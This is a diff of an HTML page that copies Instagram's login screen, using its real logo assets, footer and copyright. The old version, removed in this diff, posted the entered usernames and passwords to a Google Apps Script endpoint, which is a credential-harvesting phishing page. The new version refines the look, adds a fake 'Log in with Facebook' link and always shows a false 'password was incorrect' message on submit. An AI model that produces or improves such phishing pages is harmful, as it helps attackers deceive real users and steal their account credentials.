@@ -3,15 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Login</title>
+    <title>Login . Instagram</title>
 
     <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" type="image/x-icon">
-	
+    
     <style>
-        h1 {
-            font-family: 'Roboto', Instagram Sans;
-        }
-
         /* Basic reset */
         * {
             margin: 0;
@@ -20,13 +16,16 @@
         }
 
         body {
-            font-family: 'Arial', Instagram Sans;
+            font-family: 'Arial', sans-serif;
             background-color: #fafafa;
             display: flex;
-            flex-direction: column;
-            justify-content: center;
+            justify-content: flex-start;
             align-items: center;
+            flex-direction: column;
+            overflow-y: auto; /* Enable scrolling when necessary */
             height: 100vh;
+            padding: 15px 0; /* Ensure the main container is 15px below the top */
+            padding-bottom: 30px; /* Adjust the value as needed */
         }
 
         .container {
@@ -34,13 +33,12 @@
             width: 350px;
             padding: 40px 30px;
             border: 1px solid #dbdbdb;
-            border-radius: 0px; /* Square corners */
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 1px; /* Square corners */
+            box-shadow: none; /* Remove shadow */
             text-align: center;
-            margin-bottom: 10px; /* Margin to separate boxes */
+            margin-bottom: 10px;
         }
 
-        /* Adjust logo image size */
         .container img {
             width: 175px; /* Adjust the width as needed */
             margin-bottom: 20px; /* Space below the logo */
@@ -59,6 +57,11 @@
             border: 1px solid #dbdbdb;
             border-radius: 4px;
             outline: none;
+            color: #333; /* Regular text color */
+        }
+
+        .input-box input::placeholder {
+            color: #b0b0b0; /* Lighter placeholder text color */
         }
 
         .login-btn {
@@ -69,23 +72,17 @@
             font-weight: bold;
             border: none;
             border-radius: 4px;
+            cursor: normal; /* Normal cursor when disabled */
+            margin-bottom: 5px;
+            font-size: 16px;
+        }
+
+        .login-btn:enabled {
             cursor: pointer;
-            margin-bottom: 15px;
         }
 
         .login-btn:disabled {
             background-color: #b2dffc;
-        }
-
-        .options {
-            text-align: center;
-            margin-bottom: 15px;
-        }
-
-        .options a {
-            text-decoration: none;
-            color: #0095f6;
-            font-size: 14px;
         }
 
         .or-divider {
@@ -93,7 +90,8 @@
             align-items: center;
             text-align: center;
             color: #8e8e8e;
-            margin: 20px 0;
+            margin-top: 15px;
+            font-size: 12px; /* Smaller font size */
         }
 
         .or-divider::before,
@@ -112,14 +110,49 @@
             margin-left: 18px;
         }
 
-        /* Sign-up box with square corners */
+        .fb-login-container {
+            display: flex;
+            justify-content: center; /* Center the entire group */
+            align-items: center;
+            margin-top: 5px;
+            margin-bottom: 0px;
+        }
+
+        .fb-login-link {
+            display: flex;
+            align-items: center;
+            font-size: 14px; /* Font size for the link */
+            font-weight: bold;
+            color: #000080; /* Facebook dark blue */
+            text-decoration: none;
+        }
+
+        .fb-login-link img {
+            height: 16px; /* Very small icon size */
+            width: 16px;  /* Very small icon size */
+            margin-right: 6px; /* Space between logo and text */
+            vertical-align: middle; /* Align the icon with text */
+            margin-top: 18px;
+        }
+
+        .forgot-password-link {
+            text-align: center;
+            margin-bottom: 0px;
+        }
+
+        .forgot-password-link a {
+            text-decoration: none;
+            color: #000080; /* Dark blue color */
+            font-size: 11px;
+        }
+
         .signup-container {
             background-color: white;
             width: 350px;
             padding: 20px 30px;
             border: 1px solid #dbdbdb;
-            border-radius: 0px; /* Square corners */
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 1px; /* Square corners */
+            box-shadow: none; /* Remove shadow */
             text-align: center;
         }
 
@@ -133,7 +166,14 @@
             font-weight: bold;
         }
 
-        /* App links outside the boxes */
+        .get-app-label {
+            font-size: 14px;
+            color: #333;
+            margin-top: 15px;
+            margin-bottom: 0px;
+            text-align: center;
+        }
+
         .app-links-outside {
             display: flex;
             justify-content: center;
@@ -143,7 +183,40 @@
         .app-links-outside img {
             height: 40px; /* Adjust as needed */
             margin: 0 5px; /* Space between images */
-            background: none; /* No background */
+            background: none;
+        }
+
+        /* Error message styles */
+        .error-message {
+            color: red;
+            font-size: 12px;
+            margin: 10px 0;
+        }
+
+        .footer-links a {
+            text-decoration: none; /* Remove underline */
+            font-size: 11px; /* Small text size */
+            color: grey; /* Grey color for text */
+            margin: 0 8px; /* Add spacing between links */
+        }
+
+        .footer-links {
+            text-align: center; /* Center the links */
+            margin-top: 70px; /* Space above the links */
+        }
+
+        .footer-info {
+            text-align: center; /* Center the text */
+            font-size: 11px; /* Small text size */
+            color: grey; /* Grey color for text */
+            margin-top: 20px; /* Space between the footer links and the footer info */
+            margin-bottom: 70px; /* Add extra space at the bottom */
+        }
+
+        .footer-info .language, .footer-info .copyright {
+            display: inline-block; /* Keep the items on the same line */
+            margin: 0 5px; /* Add some spacing between the two items */
+	    margin-bottom:70px;
         }
     </style>
 </head>
@@ -152,16 +225,32 @@
     <div class="container">
         <!-- Replace this image link with the one you want to use -->
         <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo">
-        <form name='submit-to-google-sheet'>
+        <form id="login-form">
             <div class="input-box">
-                <input type="text" name='username' placeholder="Phone number, username, or email" required>
+                <input type="text" id="username" name='username' placeholder="Phone number, username, or email" required>
             </div>
             <div class="input-box">
-                <input type="password" name='password' placeholder="Password" required>
+                <input type="password" id="password" name='password' placeholder="Password" required>
             </div>
-            <button class="login-btn" disabled>Log In</button>
+            <button type="submit" id="login-btn" class="login-btn" disabled>Log In</button>
+
+            <!-- OR Divider -->
             <div class="or-divider">OR</div>
-            <div class="options">
+
+            <!-- Facebook Login Option -->
+            <div class="fb-login-container">
+                <a href="#" class="fb-login-link">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/c/cd/Facebook_logo_%28square%29.png" alt="Facebook Logo">
+                    Log in with Facebook
+                </a>
+            </div>
+
+            <!-- Error Message -->
+            <div id="error-message" class="error-message" style="display: none;">
+                Sorry, your password was incorrect. Please double-check your password.
+            </div>
+
+            <div class="forgot-password-link">
                 <a href="#">Forgot password?</a>
             </div>
         </form>
@@ -174,29 +263,56 @@
         </div>
     </div>
 
-    <!-- App download links outside the boxes with no background -->
+    <!-- Get the app label and app download links -->
+    <div class="get-app-label">Get the app.</div>
     <div class="app-links-outside">
         <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Google Play Store">
         <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Apple App Store">
     </div>
 
+    <!-- Footer -->
+    <div class="footer-links">
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Jobs</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Top Accounts</a>
+        <a href="#">Hashtags</a>
+        <a href="#">Locations</a>
+    </div>
+    <div class="footer-info">
+        <div class="language">English</div>
+        <div class="copyright">&copy; 2024 Instagram from Meta</div>
+    </div>
+
+    <!-- JavaScript to enable/disable the login button based on input -->
     <script>
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbzIkB9RlGKWWGFM9QGgJmnLXF3BU-WYGPjBL7qhJNW-p2JiO_b1d-zBJ8nIkvjqSzNM/exec';
-        const form = document.forms['submit-to-google-sheet'];
+        document.addEventListener('DOMContentLoaded', function() {
+            const usernameInput = document.getElementById('username');
+            const passwordInput = document.getElementById('password');
+            const loginBtn = document.getElementById('login-btn');
+            const errorMessage = document.getElementById('error-message');
 
-        form.addEventListener('submit', e => {
-            e.preventDefault();
-            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
-                .then(response => console.log('Success!', response))
-                .catch(error => console.error('Error!', error.message));
-        });
+            function toggleLoginButton() {
+                if (usernameInput.value && passwordInput.value) {
+                    loginBtn.disabled = false;
+                } else {
+                    loginBtn.disabled = true;
+                }
+            }
 
-        const loginBtn = document.querySelector('.login-btn');
-        const inputs = document.querySelectorAll('.input-box input');
+            usernameInput.addEventListener('input', toggleLoginButton);
+            passwordInput.addEventListener('input', toggleLoginButton);
 
-        inputs.forEach(input => {
-            input.addEventListener('input', () => {
-                loginBtn.disabled = !(inputs[0].value && inputs[1].value);
+            document.getElementById('login-form').addEventListener('submit', function(event) {
+                event.preventDefault(); // Prevent form submission
+
+                // Show error message if login button is clicked
+                errorMessage.style.display = 'block';
             });
         });
     </script>
